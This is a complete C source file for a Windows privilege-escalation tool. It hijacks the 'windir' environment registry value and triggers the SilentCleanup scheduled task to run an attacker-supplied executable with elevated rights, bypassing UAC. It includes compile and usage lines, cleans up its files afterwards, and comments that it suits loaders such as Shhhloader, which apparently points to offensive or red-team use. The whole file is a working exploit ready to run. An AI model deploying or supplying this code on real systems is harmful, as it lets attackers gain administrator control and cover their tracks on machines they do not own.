// x86_64-w64-mingw32-gcc src/standalone/SilentCleanupWinDir.c -static -s -w -loleaut32 -lole32 -o bin/standalone/SilentCleanupWinDir.exe
// Usage: .\SilentCleanupWinDir.exe [EXE ON DISK TO EXECUTE]
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <taskschd.h>
#include <sddl.h>

DWORD runTask(const wchar_t * taskname)
{
    HRESULT hr = S_OK;
    VARIANT VNull;
    ITaskFolder *pRootFolder = NULL;
    IRegisteredTask* pRegisteredTask = NULL;
    IRunningTask* pRunningTask = NULL;
    BSTR rootpath = NULL;
    BSTR taskpath = NULL;
    IID CTaskScheduler = {0x0f87369f,0xa4e5,0x4cfc,{0xbd,0x3e,0x73,0xe6,0x15,0x45,0x72,0xdd}};
    IID IIDTaskService = {0x2faba4c7, 0x4da9, 0x4013, {0x96, 0x97, 0x20, 0xcc, 0x3f, 0xd4, 0x0f, 0x85}};
    ITaskService *pService = NULL;
    // Initialize variants
    VariantInit(&VNull);
    
    // Initialize COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if(FAILED(hr))
    {
        printf("Could not initialize com (%lX)\n", hr);
        goto runTask_end;
    }

    // Get an instance of the task scheduler
    hr = CoCreateInstance( &CTaskScheduler,
                           NULL,
                           CLSCTX_INPROC_SERVER,
                           &IIDTaskService,
                           (void**)&pService ); 
    if(FAILED(hr))
    {
        printf("Failed to create Task Scheduler interface (%lX)\n", hr);
        goto runTask_end;
    }

    // Connect to the server
    hr = pService->lpVtbl->Connect(pService, VNull, VNull, VNull, VNull);
    if(FAILED(hr))
    {
        printf("Failed to connect to requested target (%lX)\n", hr);
        goto runTask_end;
    }

    // Now we need to get the root folder 
    rootpath = SysAllocString(L"\\");
    if(NULL == rootpath)
    {
        hr = ERROR_OUTOFMEMORY;
        printf("SysAllocString failed (%lX)\n", hr);
        goto runTask_end;
    }
    hr = pService->lpVtbl->GetFolder(pService, rootpath, &pRootFolder);
    if(FAILED(hr))
    {
        printf("Failed to get the root folder (%lX)\n", hr);
        goto runTask_end;
    }

    // Get the task name or current folder name
    taskpath = SysAllocString(taskname);
    if(NULL == taskpath)
    {
        hr = ERROR_OUTOFMEMORY;
        printf("SysAllocString failed (%lX)\n", hr);
        goto runTask_end;
    }

    // Get a reference to the target task
    hr = pRootFolder->lpVtbl->GetTask(pRootFolder, taskpath, &pRegisteredTask);
    if(FAILED(hr))
    {
        printf("Failed to find the task: %S (%lX)\n", taskpath, hr);
        printf("You must specify the full path and name of the task\n");
        goto runTask_end;
    }

    // Actually run the task
    hr = pRegisteredTask->lpVtbl->RunEx(pRegisteredTask, VNull, 2, 0, NULL, &pRunningTask);
    if(FAILED(hr))
    {
        printf("Failed to run the task: %S (%lX)\n", taskpath, hr);
        goto runTask_end;
    }


runTask_end:
    if(taskpath)
    {
        SysFreeString(taskpath);
        taskpath = NULL;
    }

    if(rootpath)
    {
        SysFreeString(rootpath);
        rootpath = NULL;
    }

    if(pRegisteredTask)
    {
        pRegisteredTask->lpVtbl->Release(pRegisteredTask);
        pRegisteredTask = NULL;
    }

    if(pRootFolder)
    {
        pRootFolder->lpVtbl->Release(pRootFolder);
        pRootFolder = NULL;
    }

    if(pService)
    {
        pService->lpVtbl->Release(pService);
        pService = NULL;
    }

    CoUninitialize();

    return (DWORD)hr;
}

int main(int argc, char *argv[]) {

    // check for arg
    if (argc < 2) {
        printf("No EXE supplied! Re-run the file and supply a EXE on disk as the first argument!\n");
        return 1;
    }

    // Get current username and set the tempPath to the current user's Downloads directory
    // If the current username is not found or the path is invalid, use 'C:\Users\Public\Downloads\' instead
    char tempPath[MAX_PATH] = "C:\\Users\\";
    char username[257];
    DWORD username_len = 257;
    BOOL success = GetUserName(username, &username_len);
    //BOOL success = 0; // test GetUserName failure
    if (success) {
        strcat(tempPath, username);
        strcat(tempPath, "\\Downloads");
        DWORD attributes = GetFileAttributes(tempPath);
        if (attributes == INVALID_FILE_ATTRIBUTES) {
            printf("Path based on current username is invalid: %d\n", GetLastError());
            strcpy(tempPath, "C:\\Users\\Public\\Downloads");
            printf("Using the following path instead: %s\n", tempPath);
        }
    } else {
        printf("Failed to get current username: %d\n", GetLastError());
        strcat(tempPath, "Public\\Downloads");
        printf("Using the following path instead: %s\n", tempPath);
    }
    printf("Writing temporary files to: %s\n", tempPath);

    // define and format required strings
    char tempSystem32[100] = {0};
    char targetBinLocation[100] = {0};
    strcat(tempSystem32, tempPath);
    strcat(tempSystem32, "\\System32");
    strcat(targetBinLocation, tempSystem32);
    strcat(targetBinLocation, "\\cleanmgr.exe");
    //printf("targetBinLocation: %s\n", targetBinLocation);

    // Create temp System32 directory
    BOOL test = CreateDirectoryA(tempSystem32, NULL);
    if (test == 0 && GetLastError() != 183) {
        printf("Error creating new System32 directory\n");
        return 1;
    } else {
        printf("Successfully created new System32 directory\n");
    }

    // Copy supplied EXE to target location
    int result = CopyFile(argv[1], targetBinLocation, FALSE);
    if (result != 0) {
        printf("Successfully copied target binary to temp System32 directory\n");
    } else {
        printf("Failed to copy target binary to temp System32 directory! Exiting.\n");
        goto FileCleanup;
    }

    // Create windir reg key and/or open handle to it
    HKEY attackKey;
    if(RegCreateKey(HKEY_CURRENT_USER, "Environment", &attackKey)!=ERROR_SUCCESS) return 1;

    // set windir reg key to writable dir
    LSTATUS regStatus = RegSetValueEx(attackKey, "windir", 0, REG_SZ, tempPath, strlen(tempPath));
    if (regStatus != 0) {
        printf("Error setting windir registry key!: %d\n", regStatus);
        goto FileCleanup;
    }

    // Execute the 'SilentCleanup' scheduled task
    DWORD runTaskRet = runTask(L"\\Microsoft\\Windows\\DiskCleanup\\SilentCleanup");
    if (runTaskRet != 0) {
        printf("Failed to execute SilentCleanup scheduled task!: %d\n", runTaskRet);
    } else {
        printf("Successfully executed SilentCleanup scheduled task!\n");
    }

    // reset windir key to it's default value
    char ogWinDir[MAX_PATH] = "C:\\Windows";
    regStatus = RegSetValueEx(attackKey, "windir", 0, REG_SZ, ogWinDir, strlen(ogWinDir));
    if (regStatus != 0) {
        printf("Error setting windir registry key!: %d\n", regStatus);
    }

    // close handle to reg key
    RegCloseKey(attackKey);

    // Set this sleep to be for however long the EXE will execute for. 30 seconds is a good standard for use with something like Shhhloader.
    Sleep(30000);

    FileCleanup:
    // delete exe from created directory
    result = DeleteFile(targetBinLocation);
    if (result != 0) {
        printf("File deleted succesfully: %s\n", targetBinLocation);
    }
    else {
        printf("Failed to delete '%s' in the fake windows folder: %d\n", targetBinLocation, GetLastError());
    }

    // delete created directory
    result = RemoveDirectory(tempSystem32);
    if (result != 0) {
        printf("Folder deleted succesfully: %s\n", tempSystem32);
    }
    else {
        printf("Failed to delete folder %s: %d\n", tempSystem32, GetLastError());
    }

    return 0;
}